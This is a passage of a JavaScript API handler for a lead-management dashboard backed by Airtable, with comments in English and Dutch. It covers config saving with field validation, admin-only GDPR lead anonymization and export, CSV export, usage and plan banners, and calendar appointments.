            calendlyLink:   rec.fields['fldNEj1ysRgINOOtr'] || rec.fields['Calendly Link']       || '',
            clientName:     rec.fields['fldAnB848Sr5jl6dq'] || rec.fields['Client Name']         || '',
            aiPhotoUrl:     rec.fields['fld7L0Iijq7ti6A6w'] || rec.fields['AI Photo URL']        || '',
            brandColor:     rec.fields['fldJAf4aTNlIQVL2q'] || rec.fields['Brand Color']         || '',
            formIntro:      rec.fields['fldxZ5spOeIb5omPr'] || rec.fields['Form Intro Message']  || '',
            language:       rec.fields['fld1iiV9XwSbgAACZ'] || rec.fields['Language']            || 'nl',
            // Opt-in "reply in the lead's own language" toggle. Field does
            // NOT exist on the Airtable schema yet (name: "Match Lead
            // Language", type: Checkbox) — reads as undefined -> false until
            // Sindi creates it, matching the "absent field = off" contract
            // this file already uses for every other config field.
            matchLeadLanguage: rec.fields['Match Lead Language'] === true,
            workingHours:   rec.fields['fldq5oIqw5MG8fKhc'] || rec.fields['Working Hours']       || '',
            // Email-ownership verification banner state — see api/_verify.js's
            // file header. Fails open: blank/missing field (not yet created,
            // or a pre-existing client that predates this feature) reads as
            // verified, so this can never surface a false "please verify"
            // banner for an existing client.
            emailVerified:  _verify.isVerified(rec.fields),
            trustBadges:    rec.fields['fld4nzMbnQseuGhnN'] || rec.fields['Trust Badges']        || '',
            bookingMethod:  (rec.fields['fldUI9BYO0TplgYlm'] || rec.fields['Booking Method'] || 'in_chat').toString().toLowerCase(),
            callbackWindow: rec.fields['fldKvMVBalSBRQE7H'] || rec.fields['Callback Window']     || '',
            notifyPhone:    rec.fields['fldZEApe0gfse07AU'] || rec.fields['Notify Phone']        || '',
            reportEmail:    rec.fields['fldDBJCN6dVMA8jax'] || rec.fields['Rapport Email']       || '',
            learnedPatterns: rec.fields['fldnbM5YKh274ISAl'] || rec.fields['AI Learned Patterns'] || '',
            // Derived, not stored: true the moment a Google refresh token is on
            // the record (same field the booking flow itself reads — see
            // gcalAccessForProject() above). Used by the dashboard onboarding
            // checklist's "Google Agenda koppelen" item so it never drifts out
            // of sync with the actual connection state.
            gcalConnected:  !!(rec.fields['fldkYmK3jAabvytCF'] || rec.fields['Google Refresh Token']),
            /* Welkomstwizard afgerond of overgeslagen. Server-side, niet in
               localStorage: anders begint dezelfde klant op zijn telefoon
               opnieuw bij stap 1. Ontbreekt het veld, dan leest dit als false
               en krijgt de klant de wizard -- hetzelfde "afwezig veld = uit"
               contract als de rest hierboven.
               Staat BEWUST los van checklistDismissed: de wizard overslaan mag
               de checklist niet wegnemen. Die blijft afgeleid uit de echte
               config, dus hij vinkt zichzelf af zodra de stappen gedaan zijn --
               door de wizard of gewoon via de instellingen. */
            welcomeDone:    rec.fields['fldwlx60muAv60rUg'] === true || rec.fields['Welcome Done'] === true,
            // Onboarding checklist dismiss flag — the ONLY piece of checklist
            // state that is ever stored (every item's done/not-done is derived
            // above or client-side from live app state, never persisted).
            // Field: "Onboarding Checklist Dismissed" (Checkbox, fldNKMaiCKYpT3hxM).
            // Airtable omits an unchecked/never-touched checkbox from the
            // record entirely, so blank/missing reads as false === not
            // dismissed, which is the correct default for every client, new
            // or pre-existing — nobody has dismissed a card they've never seen.
            checklistDismissed: rec.fields['fldNKMaiCKYpT3hxM'] === true || rec.fields['Onboarding Checklist Dismissed'] === true
          });
        }

        // ── SAVE config (PATCH whitelisted fields only) ──
        const u = {};
        if (body.aiName         !== undefined) u.fldRvoe1JMPOtPWC7 = String(body.aiName).trim().slice(0, 60);
        if (body.autoReplyTpl   !== undefined) u.fldOGdVq6T54xEo6W = String(body.autoReplyTpl).trim().slice(0, 1000);
        if (body.aiInstructions !== undefined) u.fld1lqHctRbqFGQf5 = String(body.aiInstructions).trim().slice(0, 3000);
        if (body.website        !== undefined) u.fldzBclLhryWQ1veO = String(body.website).trim().slice(0, 500);
        if (body.address        !== undefined) u.fldTvMSdTZOyNgWod = String(body.address).trim().slice(0, 300);
        if (body.calendlyLink   !== undefined) u.fldNEj1ysRgINOOtr = String(body.calendlyLink).trim().slice(0, 500);
        // sector goes to Niche (singleSelect). typecast:true lets unknown values pass
        if (body.sector         !== undefined) u.fld0BsPnDbBOkTHzr = String(body.sector).trim().slice(0, 100);
        // Form personalization fields (shown on the lead form page)
        if (body.aiPhotoUrl     !== undefined) {
          // Allow EITHER an external https URL OR a self-hosted base64 data URL
          // (uploaded via the file picker in dashboard). Data URLs are capped at
          // 200 KB to keep Airtable cells reasonable and form-page HTML lean.
          const raw = String(body.aiPhotoUrl).trim();
          const isHttps = /^https:\/\//.test(raw);
          const isData  = /^data:image\/(png|jpe?g|webp);base64,[A-Za-z0-9+/=]+$/.test(raw);
          if (raw === '') {
            u.fld7L0Iijq7ti6A6w = '';
          } else if (isHttps && raw.length <= 500) {
            u.fld7L0Iijq7ti6A6w = raw;
          } else if (isData && raw.length <= 200 * 1024) {
            u.fld7L0Iijq7ti6A6w = raw;
          } else {
            // Unknown format / too big. Silently drop (don't error, just don't update)
            console.warn('[config-save] aiPhotoUrl rejected: invalid format or >200KB');
          }
        }
        if (body.brandColor     !== undefined) {
          const v = String(body.brandColor).trim().slice(0, 8);
          u.fldJAf4aTNlIQVL2q = (v === '' || /^#?[0-9a-fA-F]{6}$/.test(v)) ? v : '';
        }
        if (body.formIntro      !== undefined) u.fldxZ5spOeIb5omPr = String(body.formIntro).trim().slice(0, 600);
        if (body.language       !== undefined) {
          const v = String(body.language).trim().toLowerCase();
          if (_lang.isSupportedLanguage(v)) u.fld1iiV9XwSbgAACZ = v;
        }
        // "Match Lead Language" is handled as a SEPARATE best-effort PATCH
        // below (after the main save), deliberately NOT folded into `u`.
        // Airtable rejects an entire PATCH (all fields in it, atomically)
        // with a 422 if ANY field name in the payload doesn't exist in the
        // table schema yet — folding an as-yet-nonexistent field into the
        // same request as aiName/website/etc would break saving THOSE too
        // until Sindi creates the field. Keeping it isolated means the rest
        // of config-save keeps working perfectly today, and this one setting
        // silently no-ops (logged) until the field exists.
        const wantsMatchLeadLanguageUpdate = body.matchLeadLanguage !== undefined;
        // Onboarding checklist dismiss — also isolated from `u` for the same
        // reason as Match Lead Language above (defense-in-depth: the field is
        // now known-to-exist, but keeping every "new field, best-effort" write
        // isolated means a future not-yet-created field can never take down
        // an otherwise-successful save of the fields that DO exist).
        const wantsChecklistDismissUpdate = body.checklistDismissed !== undefined;
        // Welkomstwizard — zelfde isolatie als hierboven.
        const wantsWelcomeDoneUpdate = body.welcomeDone !== undefined;
        if (body.workingHours   !== undefined) {
          // Lightweight format validation. Must match 'days hours' or be empty
          const v = String(body.workingHours).trim().toLowerCase().slice(0, 60);
          if (v === '' || /^[a-z]{3,9}\s*[-–]\s*[a-z]{3,9}\s+\d{1,2}(?::\d{2})?\s*[-–]\s*\d{1,2}(?::\d{2})?$/.test(v)) {
            u.fldq5oIqw5MG8fKhc = v;
          }
        }
        if (body.trustBadges    !== undefined) u.fld4nzMbnQseuGhnN = String(body.trustBadges).trim().slice(0, 300);
        if (body.bookingMethod  !== undefined) {
          const v = String(body.bookingMethod).trim().toLowerCase();
          // 'calendly' is deprecated. Behoud 'callback', accepteer nieuwe 'in_chat'
          if (v === 'in_chat' || v === 'callback' || v === 'calendly') u.fldUI9BYO0TplgYlm = v;
        }
        if (body.callbackWindow !== undefined) u.fldKvMVBalSBRQE7H = String(body.callbackWindow).trim().slice(0, 100);
        if (body.notifyPhone    !== undefined) {
          // Light phone validation. Must start with + or digits, allow spaces / dashes
          const v = String(body.notifyPhone).trim().slice(0, 30);
          if (v === '' || /^[+]?[0-9][0-9\s\-().]{6,29}$/.test(v)) u.fldZEApe0gfse07AU = v;
        }
        if (body.reportEmail    !== undefined) {
          const v = String(body.reportEmail).trim().slice(0, 100);
          if (v === '' || /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)) u.fldDBJCN6dVMA8jax = v;
        }
        // Klant kan zelf geleerde patronen wissen of bewerken (max 1500 chars)
        if (body.learnedPatterns !== undefined) {
          u.fldnbM5YKh274ISAl = String(body.learnedPatterns).slice(0, 1500);
        }
        if (Object.keys(u).length === 0 && !wantsMatchLeadLanguageUpdate && !wantsChecklistDismissUpdate
            && !wantsWelcomeDoneUpdate) {
          return res.status(400).json({ error: 'Niets om bij te werken' });
        }

        if (Object.keys(u).length > 0) {
          const upRes = await atFetch(
            `https://api.airtable.com/v0/${BASE_ID}/${CLIENTS_TABLE}/${rec.id}`,
            {
              method:  'PATCH',
              headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}`, 'Content-Type': 'application/json' },
              body:    JSON.stringify({ fields: u, typecast: true })
            }
          );
          if (!upRes.ok) {
            const txt = await upRes.text().catch(() => '');
            console.error('[config-save] update failed', upRes.status, txt.slice(0, 300));
            return res.status(500).json({ error: 'Opslaan mislukt' });
          }
          // Invalidate the client cache so the next leads fetch sees fresh values
          try { setCachedClient(raw, { ...rec, fields: { ...rec.fields, ...u } }); } catch {}
        }

        // "Match Lead Language" — separate, best-effort PATCH (see the
        // wantsMatchLeadLanguageUpdate comment above for why it's isolated
        // from `u`). Deliberately does NOT fail the request if the field
        // doesn't exist on the schema yet: this is a nice-to-have opt-in
        // setting, not core config, and the main fields above (which DID
        // exist) already saved successfully by this point.
        if (wantsMatchLeadLanguageUpdate) {
          try {
            const mlRes = await atFetch(
              `https://api.airtable.com/v0/${BASE_ID}/${CLIENTS_TABLE}/${rec.id}`,
              {
                method:  'PATCH',
                headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}`, 'Content-Type': 'application/json' },
                body:    JSON.stringify({ fields: { 'Match Lead Language': body.matchLeadLanguage === true }, typecast: true })
              }
            );
            if (!mlRes.ok) {
              const txt = await mlRes.text().catch(() => '');
              console.warn('[config-save] "Match Lead Language" niet opgeslagen (veld bestaat waarschijnlijk nog niet in Airtable — zie api/_lang.js voor de spec):', mlRes.status, txt.slice(0, 200));
            }
          } catch (err) {
            console.warn('[config-save] "Match Lead Language" PATCH exception:', err.message);
          }
        }

        // Onboarding checklist dismiss — separate best-effort PATCH, same
        // isolation reasoning as above. Field id fldNKMaiCKYpT3hxM (Checkbox).
        if (wantsChecklistDismissUpdate) {
          try {
            const cdRes = await atFetch(
              `https://api.airtable.com/v0/${BASE_ID}/${CLIENTS_TABLE}/${rec.id}`,
              {
                method:  'PATCH',
                headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}`, 'Content-Type': 'application/json' },
                body:    JSON.stringify({ fields: { fldNKMaiCKYpT3hxM: body.checklistDismissed === true }, typecast: true })
              }
            );
            if (!cdRes.ok) {
              const txt = await cdRes.text().catch(() => '');
              console.warn('[config-save] "Onboarding Checklist Dismissed" niet opgeslagen:', cdRes.status, txt.slice(0, 200));
            }
          } catch (err) {
            console.warn('[config-save] "Onboarding Checklist Dismissed" PATCH exception:', err.message);
          }
        }

        // Welkomstwizard afgerond/overgeslagen — apart, best-effort. Zelfde
        // isolatie: een veld dat (nog) niet bestaat mag een verder geslaagde
        // save niet onderuit halen. Veld-id fldwlx60muAv60rUg (Checkbox).
        if (wantsWelcomeDoneUpdate) {
          try {
            const wdRes = await atFetch(
              `https://api.airtable.com/v0/${BASE_ID}/${CLIENTS_TABLE}/${rec.id}`,
              {
                method:  'PATCH',
                headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}`, 'Content-Type': 'application/json' },
                body:    JSON.stringify({ fields: { fldwlx60muAv60rUg: body.welcomeDone === true }, typecast: true })
              }
            );
            if (!wdRes.ok) {
              const txt = await wdRes.text().catch(() => '');
              console.warn('[config-save] "Welcome Done" niet opgeslagen:', wdRes.status, txt.slice(0, 200));
            }
          } catch (err) {
            console.warn('[config-save] "Welcome Done" PATCH exception:', err.message);
          }
        }

        return res.status(200).json({ ok: true });
      } catch (err) {
        console.error('[config] error:', err.message);
        return res.status(500).json({ error: 'Serverfout' });
      }
    }

    // ── A1b. lead-delete — admin-authenticated erasure of ONE lead (GDPR
    // Arts. 17/20, docs/verwerkersovereenkomst-DPA.md clause 7.3). Ported
    // from the VPS backend's server/routes/leads.js (see COMPLIANCE-AUDIT.md
    // section 1.2). Only reachable by an admin token — `isAdmin` is set ONLY
    // in the auth block above, and only when the caller both authenticated
    // with the admin-derived token AND explicitly requested this mode. A
    // regular client session's own token never carries isAdmin, so it 403s
    // here like any other actor without admin rights.
    //
    // Admin has no tenant context of its own (projectCode is '' for the
    // admin path), so the target tenant is named explicitly in the body
    // (`projectCode`) and cross-checked against the lead's TRUE owner
    // (fetched fresh from Airtable) before anything is touched — same
    // 404-vs-403 ownership-check pattern used by every other mutation in
    // this file.
    //
    // `method`: 'anonymize' (DEFAULT — scrubs PII, keeps the record + every
    // aggregate/analytics field so a client's dashboard stats don't change
    // shape just because one lead was erased) or 'hard-delete' (removes the
    // Airtable record entirely).
    //
    // Erasure audit log: Airtable has no append-only log table for this
    // (unlike the VPS's erasure_log table) and adding one is a schema change
    // to the live base that's the owner's call, not this batch's — see
    // VERCEL-DEPLOY-CHECKLIST.md's "known gaps" section. Every erasure/
    // export is instead logged clearly to console with a `[erasure]` prefix
    // (id, projectCode, action, actor, timestamp) as an interim durable-ish
    // record (Vercel function logs).
    if (body.mode === 'lead-delete') {
      if (!isAdmin) return res.status(403).json({ error: 'Alleen admin kan een lead verwijderen/anonimiseren' });
      const id = String(body.id || '').trim();
      if (!/^rec[A-Za-z0-9]{14}$/.test(id)) return res.status(400).json({ error: 'Ongeldig lead ID' });
      const targetProjectCode = String(body.projectCode || '').trim();
      if (!targetProjectCode) return res.status(400).json({ error: 'projectCode ontbreekt' });
      const method = body.method === 'hard-delete' ? 'hard-delete' : 'anonymize';

      try {
        const ownCheck = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${id}`,
          { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
        );
        if (!ownCheck.ok) return res.status(404).json({ error: 'Lead niet gevonden' });
        const existing = await ownCheck.json();
        const ownProject = existing.fields?.['fldSmczuyUJd26HLe'] || existing.fields?.['Project Code'] || '';
        if (ownProject !== targetProjectCode) {
          return res.status(403).json({ error: 'Lead behoort niet tot de opgegeven projectCode' });
        }

        if (method === 'hard-delete') {
          const delRes = await atFetch(
            `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${id}`,
            { method: 'DELETE', headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
          );
          if (!delRes.ok) {
            const t = await delRes.text().catch(() => '');
            console.error('[erasure] hard-delete failed', delRes.status, t.slice(0, 300));
            return res.status(500).json({ error: 'Verwijderen mislukt' });
          }
          console.log(`[erasure] action=delete id=${id} projectCode=${targetProjectCode} actor=admin ts=${new Date().toISOString()}`);
          return res.status(200).json({ ok: true, method: 'hard-delete', id });
        }

        // anonymize (default): overwrite ONLY the columns that hold the
        // lead's identity or raw conversation content. Every aggregate/
        // analytics field (Qualified, Lead Score, Ability/Urgency/Fit,
        // Conversation State, Booking Link Sent, Appointment Booked, Bron,
        // Verwachte Waarde, Response Time, Reason, Opgepikt, Created At) is
        // DELIBERATELY left untouched — same rationale as the VPS's
        // anonymizeLead() in server/db/index.js. Phone uses `null` (clears
        // the field); the rest use '' — Airtable accepts either to clear a
        // text/longtext field, matching how this file already clears optional
        // text fields elsewhere (e.g. config-save's aiPhotoUrl `''` case).
        const anonFields = {
          fldbk0LVNckOU0bqA: '[verwijderd]',      // Name
          fld6YaitW0lMqHUrd: null,                 // Phone
          'Conversation History': JSON.stringify([]),
          'Last Message': '',
          fldqerIiw5qyQjXHr: '',                   // AI Summary
          fldoLRI5W12ThTls7: '',                   // Notities
        };
        const anonRes = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${id}`,
          {
            method:  'PATCH',
            headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}`, 'Content-Type': 'application/json' },
            body:    JSON.stringify({ fields: anonFields })
          }
        );
        if (!anonRes.ok) {
          const t = await anonRes.text().catch(() => '');
          console.error('[erasure] anonymize failed', anonRes.status, t.slice(0, 300));
          return res.status(500).json({ error: 'Anonimiseren mislukt' });
        }
        const anonData = await anonRes.json();
        console.log(`[erasure] action=anonymize id=${id} projectCode=${targetProjectCode} actor=admin ts=${new Date().toISOString()}`);
        return res.status(200).json({ ok: true, method: 'anonymize', record: anonData });
      } catch (err) {
        console.error('[leads] lead-delete error:', err.message);
        return res.status(500).json({ error: 'Serverfout' });
      }
    }

    // ── A1c. lead-export — admin-authenticated single-lead data-portability
    // dump (GDPR Arts. 15/20). Same admin-only + explicit-projectCode +
    // ownership-check-then-scoped-fetch pattern as lead-delete above. Still
    // logged (action=export) even though nothing is mutated, so there's a
    // console record of when a lead's data was accessed and by whom (see
    // lead-delete's comment above on the erasure-log-is-console-only gap).
    if (body.mode === 'lead-export') {
      if (!isAdmin) return res.status(403).json({ error: 'Alleen admin kan een lead exporteren' });
      const id = String(body.id || '').trim();
      if (!/^rec[A-Za-z0-9]{14}$/.test(id)) return res.status(400).json({ error: 'Ongeldig lead ID' });
      const targetProjectCode = String(body.projectCode || '').trim();
      if (!targetProjectCode) return res.status(400).json({ error: 'projectCode ontbreekt' });

      try {
        const r = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${id}`,
          { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
        );
        if (!r.ok) return res.status(404).json({ error: 'Lead niet gevonden' });
        const record = await r.json();
        const ownProject = record.fields?.['fldSmczuyUJd26HLe'] || record.fields?.['Project Code'] || '';
        if (ownProject !== targetProjectCode) {
          return res.status(403).json({ error: 'Lead behoort niet tot de opgegeven projectCode' });
        }

        let conversationHistory = [];
        const stored = record.fields?.['Conversation History'];
        if (stored) { try { conversationHistory = JSON.parse(stored); } catch {} }

        console.log(`[erasure] action=export id=${id} projectCode=${targetProjectCode} actor=admin ts=${new Date().toISOString()}`);
        return res.status(200).json({
          ok: true,
          data: { id: record.id, fields: record.fields || {}, conversationHistory }
        });
      } catch (err) {
        console.error('[leads] lead-export error:', err.message);
        return res.status(500).json({ error: 'Serverfout' });
      }
    }

    // ── A2. csv-export. Download all leads for this client as CSV ──────────
    // body: { mode: 'csv-export' }
    // Returns text/csv with UTF-8 BOM (so Excel renders accents correctly).
    if (body.mode === 'csv-export') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      try {
        // Fetch all leads for this project. Paginate manually if >100
        const all = [];
        let offset = '';
        for (let page = 0; page < 20; page++) {  // hard cap 2000 leads
          const formula = encodeURIComponent(`{Project Code}="${escapeFormula(projectCode)}"`);
          const url = `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}?filterByFormula=${formula}&pageSize=100&sort%5B0%5D%5Bfield%5D=Created%20At&sort%5B0%5D%5Bdirection%5D=desc${offset ? `&offset=${encodeURIComponent(offset)}` : ''}`;
          const r = await atFetch(url, { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } });
          if (!r.ok) break;
          const d = await r.json();
          all.push(...(d.records || []));
          if (!d.offset) break;
          offset = d.offset;
        }

        /* Dezelfde filters die het scherm op de voorbeeldweergave toepast, hier
           ook echt uitvoeren. Ze kwamen niet mee en werden dus genegeerd: het
           scherm zei "4 leads geselecteerd" en het bestand bevatte er 380. Een
           export die iets anders bevat dan wat je aanvinkte is erger dan geen
           export -- je merkt het pas als je hem al ergens ingelezen hebt.

           De regels staan met opzet gelijk aan updateExportPreview() in
           api/dashboard.js. Lopen ze uiteen, dan klopt de telling weer niet. */
        const periodeRuw = String(body.periode == null ? 'all' : body.periode);
        const dagen = parseInt(periodeRuw, 10);
        const grens = (periodeRuw === 'all' || !Number.isFinite(dagen))
          ? null : Date.now() - dagen * 86400000;
        const statusFilter = (body.status === 'qualified' || body.status === 'unqualified')
          ? body.status : 'all';

        const gefilterd = all.filter((rec) => {
          const f = rec.fields || {};
          if (grens !== null) {
            const gemaakt = Date.parse(f['Created At'] || '');
            if (!Number.isFinite(gemaakt) || gemaakt < grens) return false;
          }
          if (statusFilter === 'all') return true;
          const score = Number(f['Lead Score']);
          const isGekwalificeerd = f['Qualified'] === true || (Number.isFinite(score) && score >= 7);
          return statusFilter === 'qualified' ? isGekwalificeerd : !isGekwalificeerd;
        });
        all.length = 0;
        all.push.apply(all, gefilterd);
        // Build CSV. Guard against formula injection, quote fields, escape
        // internal quotes by doubling them
        const csvEscape = (v) => {
          const s = csvFormulaGuard(String(v == null ? '' : v))
            .replace(/\r?\n/g, ' ').replace(/"/g, '""');
          return `"${s}"`;
        };
        const headers = ['Datum', 'Naam', 'Telefoon', 'Bron', 'Status', 'Gekwalificeerd', 'Lead Score', 'Ability', 'Urgency', 'Fit', 'Samenvatting', 'Reden', 'Booking Sent', 'Opgepikt', 'Verwachte Waarde', 'Notities'];
        const rows = [headers.map(csvEscape).join(',')];
        for (const rec of all) {
          const f = rec.fields || {};
          rows.push([
            f['Created At'] || '', f['Name'] || '', f['Phone'] || '', f['Bron'] || '',
            f['Conversation State'] || '', f['Qualified'] ? 'ja' : 'nee',
            f['Lead Score'] || '', f['Ability'] || '', f['Urgency'] || '', f['Fit'] || '',
            f['AI Summary'] || '', f['Reason'] || '',
            f['Booking Link Sent'] ? 'ja' : 'nee', f['Opgepikt'] ? 'ja' : 'nee',
            f['Verwachte Waarde'] || '', f['Notities'] || ''
          ].map(csvEscape).join(','));
        }
        const csv = '﻿' + rows.join('\r\n');  // BOM for Excel
        const ts  = new Date().toISOString().slice(0, 10);
        res.setHeader('Content-Type', 'text/csv; charset=utf-8');
        res.setHeader('Content-Disposition', `attachment; filename="helvaro-leads-${projectCode}-${ts}.csv"`);
        return res.status(200).send(csv);
      } catch (err) {
        console.error('[csv-export] error:', err.message);
        return res.status(500).json({ error: 'Export mislukt' });
      }
    }

    // ── A3. report-summary — ROI / value reporting for the dashboard's
    // "Resultaten" panel and the weekly client email. Aggregates ONLY what
    // Airtable already contains for the requested period, plus the same
    // figures for the PREVIOUS equivalent period (so the caller can show a
    // trend delta). Client-session-authenticated and Project-Code-scoped
    // like every other mode in this file.
    //
    // Honest-numbers rules (non-negotiable, see REPORTING-SUMMARY.md):
    //   - Never invent/extrapolate/project revenue.
    //   - "Verwachte Waarde" is a client-entered ESTIMATE. Reported as
    //     pipeline/expected value, never as revenue. Leads with no estimate
    //     are excluded from both the sum and the average (never treated as
    //     €0, which would silently deflate the average).
    //   - Lead score / response time averages exclude records where the
    //     field is absent, not treat missing as zero.
    //
    // body: { mode: 'report-summary', period: 'this_month' | 'last_30_days' | 'all_time' }
    if (body.mode === 'report-summary') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      const period = ['this_month', 'last_30_days', 'all_time'].includes(body.period) ? body.period : 'this_month';
      try {
        // Fetch ALL leads for this project. Same pagination pattern + hard
        // cap as csv-export / the main GET path (20 pages * 100 = 2000 leads).
        const all = [];
        let offset = '';
        for (let page = 0; page < 20; page++) {
          const formula = encodeURIComponent(`{fldSmczuyUJd26HLe}="${escapeFormula(projectCode)}"`);
          const url = `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}?filterByFormula=${formula}&pageSize=100${offset ? `&offset=${encodeURIComponent(offset)}` : ''}`;
          const r = await atFetch(url, { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } });
          if (!r.ok) break;
          const d = await r.json();
          all.push(...(d.records || []));
          if (!d.offset) break;
          offset = d.offset;
        }

        const bounds   = reportPeriodBounds(period);
        const current  = aggregateReportPeriod(all, bounds.currentStart, bounds.currentEnd);
        const previous = bounds.hasPrevious ? aggregateReportPeriod(all, bounds.previousStart, bounds.previousEnd) : null;

        return res.status(200).json({
          ok: true,
          period,
          periodLabel: bounds.label,
          current: {
            ...current,
            from: new Date(bounds.currentStart).toISOString(),
            to:   new Date(bounds.currentEnd).toISOString()
          },
          previous: previous ? {
            ...previous,
            from: new Date(bounds.previousStart).toISOString(),
            to:   new Date(bounds.previousEnd).toISOString()
          } : null
        });
      } catch (err) {
        console.error('[report-summary] error:', err.message);
        return res.status(500).json({ error: 'Serverfout' });
      }
    }

    // ── credit-usage: client-facing usage bar data ─────────────────────────
    // body: { mode: 'credit-usage' }
    // Returns { active:false } (nothing to render — inert/unconfigured) or a
    // full summary. Never errors the dashboard: any credit-system problem
    // just means the widget stays hidden, same fail-open contract as
    // everywhere else in _credits.js.
    if (body.mode === 'credit-usage') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      const summary = await credits.getUsageSummary(projectCode);
      return res.status(200).json(summary);
    }

    // ── plan-status: client-facing trial/expiry banner data ────────────────
    // body: { mode: 'plan-status' }
    // Returns { show:false } when the client's plan needs no banner (active,
    // or blank Plan Status — the fail-open default every pre-trial client
    // has), or { show:true, status:'trial'|'expired', daysLeft, trialEndsAt }
    // otherwise. 'cancelled'/'paused' also return show:false here — the
    // dashboard banner spec (TRIAL-DESIGN.md's touchpoint table) only covers
    // trial/expired; api/whatsapp.js and api/cron-followup.js still treat
    // cancelled/paused as service-stopped independently of this banner.
    // Never errors the dashboard: any problem just means the banner stays
    // hidden, same fail-open contract as credit-usage above.
    if (body.mode === 'plan-status') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      try {
        const formula = encodeURIComponent(`{fldN4dL0bGgfBOXwM}="${escapeFormula(projectCode)}"`);
        const cRes = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${CLIENTS_TABLE}?filterByFormula=${formula}&maxRecords=1`,
          { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
        );
        if (!cRes.ok) return res.status(200).json({ show: false });
        const cData = await cRes.json();
        const rec = (cData.records || [])[0];
        if (!rec) return res.status(200).json({ show: false });

        const planState = getPlanState(rec.fields || {});
        if (planState.status !== 'trial' && planState.status !== 'expired') {
          return res.status(200).json({ show: false });
        }
        return res.status(200).json({
          show: true,
          status: planState.status,
          daysLeft: planState.daysLeft,
          trialEndsAt: planState.trialEndsAt,
        });
      } catch (err) {
        console.warn('[plan-status] failed, hiding banner:', err.message);
        return res.status(200).json({ show: false });
      }
    }

    // ── APPOINTMENTS — custom calendar (vervangt Calendly) ────────────────
    // body: { mode: 'appointments-list', from?: ISO, to?: ISO }
    // Returnt alle afspraken voor deze klant binnen het bereik (default = volgende 30 dagen).
    if (body.mode === 'appointments-list') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      const APPOINTMENTS_TABLE = 'tblD058vEITs1xYFc';
      const from = body.from || new Date(Date.now() - 7*24*60*60*1000).toISOString();
      const to   = body.to   || new Date(Date.now() + 30*24*60*60*1000).toISOString();
      const formula = encodeURIComponent(
        `AND({Project Code}="${escapeFormula(projectCode)}", IS_AFTER({Start Time}, "${from}"), IS_BEFORE({Start Time}, "${to}"))`
      );
      try {
        const r = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${APPOINTMENTS_TABLE}?filterByFormula=${formula}&pageSize=100&sort%5B0%5D%5Bfield%5D=Start+Time&sort%5B0%5D%5Bdirection%5D=asc`,
          { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
        );
        if (!r.ok) return res.status(500).json({ error: 'Airtable fout' });
        const d = await r.json();

        // Also pull the client's real Google Calendar entries for the same
        // window. Without this the Kalender page showed ONLY appointments
        // Helvaro itself booked, so a client looked at an apparently free
        // week and could double-book straight over their own meetings.
        // The calendar.readonly scope is already granted at connect time.
        // Fail-soft: on any Google problem this stays [] and the page still
        // renders the Helvaro appointments.
        let externalEvents = [];
        try {
          const { token: gToken, calId: gCalId } = await gcalAccessForProject(
            projectCode, AIRTABLE_TOKEN, BASE_ID, CLIENTS_TABLE
          );
          if (gToken) externalEvents = await _gcal.listEvents(gToken, gCalId, from, to);
        } catch (e) {
          console.warn('[appointments-list] gcal listEvents failed:', e && e.message);
        }

        return res.status(200).json({ appointments: d.records || [], externalEvents });
      } catch (err) {
        return res.status(500).json({ error: 'Serverfout' });
      }
    }

    // body: { mode: 'appointment-create', startTime, duration?, leadId?, leadName?, leadPhone?, notes? }
    if (body.mode === 'appointment-create') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      const APPOINTMENTS_TABLE = 'tblD058vEITs1xYFc';
      if (!body.startTime) return res.status(400).json({ error: 'startTime ontbreekt' });
      const dt = new Date(body.startTime);
      if (isNaN(dt.getTime())) return res.status(400).json({ error: 'Ongeldige startTime' });

      // Availability check against the client's Google Calendar, BEFORE any
      // write. Fetch the access once and reuse it below for the post-write
      // mirror too, instead of refreshing the OAuth token twice. No lead has
      // been told anything yet at this point (unlike api/whatsapp.js's
      // in-chat booking, where the AI already confirmed to the lead before
      // this check can run) — a staff member is booking directly from the
      // dashboard, so on conflict we can simply refuse the write and let the
      // UI show an error, with nothing to walk back. isSlotFree() fails OPEN
      // on any Google/network error (see api/_gcal.js) — a Google outage
      // must never block a booking, so this only refuses on a genuine,
      // confirmed overlap. No token (client never connected Google) means
      // there's nothing to check, so behaviour is unchanged for clients
      // without Google Calendar connected.
      let gToken = '', gCalId = 'primary';
      try {
        const gcalAccessRes = await gcalAccessForProject(projectCode, AIRTABLE_TOKEN, BASE_ID, CLIENTS_TABLE);
        gToken = gcalAccessRes.token; gCalId = gcalAccessRes.calId;
        if (gToken) {
          const free = await _gcal.isSlotFree(gToken, gCalId, body.startTime, parseInt(body.duration) || 30);
          if (!free) {
            return res.status(409).json({ error: 'Dat moment is al bezet in de Google agenda. Kies een ander tijdstip.', code: 'slot_conflict' });
          }
        }
      } catch (e) {
        // Both helpers already fail closed/open internally and should never
        // throw — this is belt-and-braces. Any unexpected error here must be
        // treated like "no Google" (fail open), never like a booking failure.
        console.error('[gcal] availability check exception (treating as no-Google):', e && e.message);
        gToken = '';
      }

